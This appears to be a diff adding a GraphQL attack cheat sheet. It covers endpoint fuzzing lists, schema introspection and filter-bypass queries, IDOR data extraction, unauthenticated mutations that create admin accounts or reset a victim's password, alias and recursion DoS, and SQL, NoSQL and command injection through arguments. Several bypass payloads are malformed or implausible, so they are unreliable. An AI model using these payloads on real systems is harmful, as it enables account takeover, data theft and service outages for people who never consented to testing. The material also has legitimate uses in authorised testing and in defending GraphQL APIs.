@@ -1,0 +1,209 @@
+# GraphQL Payloads
+
+## ENDPOINT DISCOVERY (paste into ffuf or Intruder)
+```
+/graphql
+/graphiql
+/graph
+/gql
+/query
+/api
+/api/graphql
+/api/v1/graphql
+/api/v2/graphql
+/api/v3/graphql
+/api/gql
+/apis/graphql
+/v1/graphql
+/v2/graphql
+/dashboard/graphql
+/console/graphql
+/admin/graphql
+/player/graphql
+/graphql.php
+/graphql/explorer
+/graphql/console
+/explorer
+/playground
+/altair
+/voyager
+```
+Also test with `?query=` parameter variations:
+```
+/graphql?query={__typename}
+/query?query={__typename}
+```
+
+## DETECTION (minimal queries)
+```graphql
+{__typename}
+query{__typename}
+mutation{__typename}
+```
+POST body example:
+```json
+{"query":"{__typename}"}
+```
+GET example: `?query={__typename}`
+
+## INTROSPECTION — dump the whole schema
+```graphql
+query{__schema{types{name kind fields{name args{name type{name kind ofType{name}}}}}}}
+```
+Full introspection (common copy):
+```graphql
+{
+  __schema {
+    queryType { name }
+    mutationType { name }
+    types {
+      kind
+      name
+      fields {
+        name
+        args { name type { kind name ofType { kind name ofType { kind name } } } }
+      }
+    }
+  }
+}
+```
+Find "type Query" fields:
+```graphql
+{__type(name:"Query"){name fields{name}}
+```
+
+## If introspection is blocked (common WAF block), try aliases / fragments
+```graphql
+{"query":"{__s\x63hema{types{name}}}"}
+{"query":"query{a:__schema{types{name}}}"}
+{"query":"{__schema{types{name}}}" ,"operationName":"x"}
+```
+Multiline bypass:
+```
+{
+  "__schema" {
+    types {
+      name
+    }
+  }
+}
+```
+
+## DATA EXTRACTION (IDOR-style)
+Work from schema → object types:
+```graphql
+query {
+  user(id: 1) { id username email role }
+}
+```
+```graphql
+{
+  users(first: 100) { edges { node { id email name } } }
+  orders(first: 100) { edges { node { id total } } }
+}
+```
+Null / zero / negative IDs and strings:
+```graphql
+user(id: 0), user(id: 1), user(id: 2), user(id: "1"), user(id: null)
+```
+
+## AUTH BYPASS / MUTATIONS (the big win)
+Without a token, try to create/modify:
+```graphql
+mutation {
+  createUser(input: {email: "attacker@test.com", password: "Password123!", role: ADMIN}) {
+    id
+  }
+}
+```
+```graphql
+mutation {
+  updateUser(id: 1, input: {role: ADMIN, password: "pwned"}) { id }
+}
+```
+```graphql
+mutation {
+  resetPassword(email: "victim@test.com", newPassword: "pwned123") { success }
+  login(input: {email: "victim@test.com", password: "pwned123"}) { token }
+}
+```
+```graphql
+mutation {
+  deleteUser(id: 1) { success }
+}
+```
+Try field-level authz bypass:
+```graphql
+query { user(id: 1) { phone __internalView secret lastCreditCard } }
+```
+
+## BATCHING / ALIASING DoS (request amplification)
+Same query repeated N times in one request:
+```graphql
+{
+  me { username email }
+  a2: me { username email }
+  a3: me { username email }
+  a4: me { username email }
+  ... (repeat)
+  a100: me { username email }
+}
+```
+Expensive recursion (depth abuse):
+```graphql
+query {
+  user(id: 1) {
+    friends {
+      friends { friends { friends { friends { friends { id } } } } }
+    }
+  }
+}
+```
+Mutation spam (each alias = one mutation):
+```graphql
+mutation {
+  a1: createComment(input: {text: "x"}) { id }
+  a2: createComment(input: {text: "x"}) { id }
+  ... many ...
+}
+```
+
+## INJECTION VIA ARGUMENTS
+If args land in SQL/NoSQL/command:
+```graphql
+# SQLi style
+query { search(pattern: "' OR '1'='1") { results } }
+
+# NoSQLi style
+query { user(email: {"$ne": null}) { id email } }
+
+# Command arg
+query { run(command: "id") { output } }
+```
+
+## METHOD/HEADER tricks
+Try introspection on different HTTP methods & content types:
+```
+POST /graphql        Content-Type: application/json
+POST /graphql        Content-Type: application/x-www-form-urlencoded
+GET  /graphql?query=...
+POST /graphql        Content-Type: application/graphql   (raw query body)
+```
+
+## Introspection-bypass when filtered string "introspection" is blocked
+```json
+{"query":"query __S__{__S__chema{types{name fields{name}}}}"}
+```
+Unicode/URL-encoded variants in GET param: `%5b%5b__schema%5d%5d` etc.
+
+## Tool one-liners
+```bash
+# InQL
+inql -t https://target.com/graphql
+
+# graphql-cop
+python3 graphql-cop.py -t https://target.com/graphql
+
+# graphw00f fingerprint
+python3 main.py -t https://target.com/graphql
+```
